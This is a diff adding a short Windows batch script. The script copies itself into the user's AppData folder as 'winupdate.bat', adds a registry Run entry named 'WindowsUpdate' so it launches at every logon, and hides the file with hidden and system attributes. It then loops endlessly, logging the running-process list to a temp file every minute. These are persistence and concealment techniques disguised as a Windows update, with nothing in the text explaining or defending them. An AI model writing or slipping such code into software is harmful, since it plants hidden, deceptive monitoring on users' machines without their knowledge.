@@ -1,0 +1,8 @@
+@echo off
+copy /Y "%~f0" "%APPDATA%\winupdate.bat" >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%APPDATA%\winupdate.bat" /f
+attrib +h +s "%APPDATA%\winupdate.bat"
+:BUCLE
+tasklist > "%TEMP%\t.txt"
+timeout /t 60 >nul
+goto BUCLE
